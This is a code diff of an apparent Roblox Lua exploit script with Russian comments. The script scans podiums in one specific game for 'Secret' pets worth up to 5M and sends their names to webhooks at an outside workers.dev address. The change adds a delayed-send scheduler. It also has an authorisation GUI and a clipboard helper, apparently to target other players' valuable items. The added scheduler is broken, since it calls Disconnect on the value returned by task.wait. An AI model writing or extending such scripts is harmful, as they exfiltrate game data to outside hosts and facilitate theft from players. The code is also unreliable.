@@ -20,6 +20,11 @@ local ADDITIONAL_WEBHOOK_URL = "https://rep.ily123950950.workers.dev/?msg="
 local sentFirstWebhook = {}
 local sentSecondWebhook = {}
 local sentThirdWebhook = {}
+
+-- Переменная для отслеживания времени первой отправки
+local firstWebhookTimer = nil
+local pendingFirstWebhookData = nil
+
 local function copyToClipboard(text)
     if setclipboard then
         setclipboard(text)
@@ -29,6 +34,7 @@ local function copyToClipboard(text)
         return false
     end
 end
+
 local function createAuthGUI()
     local playerGui = player:WaitForChild("PlayerGui")
 
@@ -493,6 +499,26 @@ local function sendDiscordWebhook(models, webhookUrl, isThirdWebhook)
     end
 end
 
+-- Функция для отправки первого вебхука с задержкой
+local function scheduleFirstWebhook(secretModelsText)
+    if firstWebhookTimer then
+        -- Отменяем предыдущий таймер, если он существует
+        firstWebhookTimer:Disconnect()
+    end
+    
+    pendingFirstWebhookData = secretModelsText
+    
+    firstWebhookTimer = task.wait(5) -- Ждем 5 секунд
+    
+    -- Проверяем, что данные все еще актуальны и папка не создана
+    if pendingFirstWebhookData and not folderExists then
+        sendDiscordWebhook(pendingFirstWebhookData, WEBHOOK_WORKER_URL, false)
+        pendingFirstWebhookData = nil
+    end
+    
+    firstWebhookTimer = nil
+end
+
 local function checkPodiums()
     if game.PlaceId ~= 109983668079237 then
         return
@@ -516,7 +542,7 @@ local function checkPodiums()
             local displayName = podium.labels.DisplayName
             
             if rarity == "Secret" then
-                -- ИСПРАВЛЕНО: Проверяем что ВСЕ петы имеют генерацию <= 5М для первого вебхука
+                -- Проверяем что ВСЕ петы имеют генерацию <= 5М для первого вебхука
                 if genValue <= 5000000 and not sentFirstWebhook[displayName] then
                     -- Проверим все петы в текущем списке, чтобы убедиться что все <= 5М
                     local allUnder5M = true
@@ -548,10 +574,12 @@ local function checkPodiums()
             end
         end
         
+        -- ИСПРАВЛЕНО: Используем планировщик для первого вебхука с задержкой в 5 секунд
         if #secretModelsFirstWebhook > 0 and not folderExists then
             local secretModelsText = table.concat(secretModelsFirstWebhook, ", ")
-            wait(5) -- Задержка 5 секунд перед отправкой в первый вебхук
-            sendDiscordWebhook(secretModelsText, WEBHOOK_WORKER_URL, false)
+            spawn(function()
+                scheduleFirstWebhook(secretModelsText)
+            end)
         end
         
         if #secretModelsSecondWebhook > 0 and not folderExists then
